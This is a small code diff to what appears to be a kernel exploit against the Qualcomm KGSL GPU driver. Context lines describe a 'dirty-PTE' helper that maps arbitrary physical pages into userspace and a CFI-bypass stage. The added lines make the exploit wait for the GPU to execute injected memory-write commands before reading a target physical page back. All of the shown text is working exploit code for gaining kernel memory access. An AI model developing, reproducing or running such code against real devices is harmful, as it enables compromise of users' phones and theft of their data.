@@ -33,6 +33,8 @@ struct kgsl_ringbuffer_issueibcmds {
 };
 #define IOCTL_KGSL_DRAWCTXT_CREATE_ _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
 #define IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_ _IOWR(0x09, 0x10, struct kgsl_ringbuffer_issueibcmds)
+struct kgsl_device_waittimestamp { unsigned int timestamp; unsigned int timeout; };
+#define IOCTL_KGSL_DEVICE_WAITTIMESTAMP_ _IOW(0x09, 0x6, struct kgsl_device_waittimestamp)
 #define CP_MEM_WRITE 0x3du
 
 /* --- dirty-PTE helper: map an arbitrary physical page into userspace --------
@@ -1478,6 +1480,15 @@ int try_cfi_stage(void) {
                           int ri = ioctl(gfd, IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_, &ic);
                           pr_info("kgw: submit ret=%d ts=%u errno=%d\n",
                                   ri, ic.timestamp, errno); fsync(1);
+                          /* wait for the GPU to actually execute the IB */
+                          if (ri == 0) {
+                            struct kgsl_device_waittimestamp wt;
+                            wt.timestamp = ic.timestamp; wt.timeout = 2000;
+                            int rw = ioctl(gfd, IOCTL_KGSL_DEVICE_WAITTIMESTAMP_, &wt);
+                            pr_info("kgw: waittimestamp ret=%d errno=%d\n", rw, errno);
+                            fsync(1);
+                            usleep(200000);
+                          }
                           /* read the target page back in-process via a dirty PTE */
                           const char *sp2 = getenv("KGSL_SGT_PHYS");
                           uint64_t tphys = sp2 ? strtoull(sp2, NULL, 0) : 0;
